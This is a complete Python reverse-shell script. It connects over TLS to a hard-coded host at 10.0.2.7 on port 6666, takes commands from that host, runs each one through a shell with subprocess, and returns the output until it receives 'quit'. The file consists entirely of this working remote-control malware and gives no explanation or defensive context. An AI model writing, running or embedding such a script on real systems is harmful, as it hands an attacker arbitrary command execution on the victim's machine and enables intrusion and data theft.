#!/usr/bin/env python

import socket
import subprocess
import ssl

HOST = "10.0.2.7"
PORT = 6666


def system_command(command):
    if command == "quit":
        wrappedConnection.close()
        exit()
    return subprocess.check_output(command, shell=True)


reverseConnection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
wrappedConnection = ssl.wrap_socket(reverseConnection, ssl_version=ssl.PROTOCOL_TLSv1, server_side=False)
wrappedConnection.connect((HOST, PORT))

while True:
    command = wrappedConnection.recv(1024).decode("utf-8", "ignore")
    command_result = system_command(command)
    wrappedConnection.send(command_result)
